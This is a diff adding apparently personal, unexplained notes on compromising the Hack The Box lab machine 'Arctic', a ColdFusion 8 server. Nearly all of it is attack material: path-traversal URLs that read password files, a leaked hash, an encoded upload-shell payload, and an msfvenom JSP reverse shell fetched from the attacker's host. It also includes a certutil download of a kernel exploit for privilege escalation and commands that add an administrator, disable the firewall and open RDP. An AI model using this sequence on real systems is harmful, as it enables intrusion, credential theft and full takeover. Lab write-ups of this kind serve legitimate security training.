@@ -1,0 +1,64 @@
+(Working) https://0xw0lf.github.io//posts/HTB-Arctic
+https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/
+
+https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes
+
+
+LFI	Affects
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear
+\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
+
+#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true 
+
+http://10.10.10.11:8500/CFIDE/probe.cfm?name=%3Cb%3E%26%23181%3BSH%3C%2Fb%3E%22%3C%2Fh1%3E%3Ccfif%20isDefined(%22Form.File%22)%3E%3Ccftry%3E%3Ccffile%20action%3D%22upload%22%20destination%3D%22%23Expandpath(%22.%22)%23%22%20filefield%3D%22Form.File%22%20nameconflict%3D%22overwrite%22%3EFile%20uploaded!%3Ccfcatch%3EUpload%20failed%3C%2Fcfcatch%3E%3C%2Fcftry%3E%3C%2Fcfif%3E%3Cform%20method%3DPOST%20enctype%3D%22multipart%2Fform-data%22%3E%3Cinput%20type%3Dfile%20name%3D%22File%22%3E%3Cinput%20type%3Dsubmit%20value%3D%22Upload%22%3E%3C%2Fform%3E%3Cscript%3E
+
+vim cf8_autopwn.rb
+#locale = 'locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en'
+locale = 'locale=../../../../../../../../ColdFusion8\lib\password.properties%00en'
+
+#hash = OpenSSL::HMAC.hexdigest('sha1',salt, password)
+hash = '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'
+
+
+root@kali:~ruby cf8_autopwn.rb 10.10.10.11 8500
+CFID=101;expires=Sun, 03-Apr-2050 23:25:17 GMT;path=/, CFTOKEN=91607179;expires=Sun, 03-Apr-2050 23:25:17 GMT;path=/, CFAUTHORIZATION_cfadmin=;expires=Wed, 10-Apr-2019 23:25:17 GMT;path=/, CFAUTHORIZATION_cfadmin=;expires=Wed, 10-Apr-2019 23:25:17 GMT;path=/
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm
+admin/happyday
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=6789 -f raw > jsprevshell.jsp
+python -m SimpleHTTPServer 80
+Schedule task
+http://10.10.14.9/jsprevshell.jsp
+Publish to file C:\ColdFusion8\wwwroot\CFIDE\jsprevshell.jsp
+
+shell.jsp is saved to http://10.10.10.11:8500/CFIDE/jsprevshell.jsp
+nc -lnvp 6789
+
+http://10.10.10.11:8500/CFIDE/jsprevshell.jsp
+whoami
+arctic\tolis
+
+Windows Suggester
+MS10-059
+https://github.com/egre55/windows-kernel-exploits
+
+certutil.exe -urlcache -split -f http://10.10.14.9/Chimichurri.exe Chimichurri.exe
+Chimichurri.exe 10.10.14.9 5678
+
+nc -nlvp 5678
+
+net user newuser Password123 /add
+net localgroup administrators newuser /add
+
+netsh advfirewall set allprofiles state off
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+
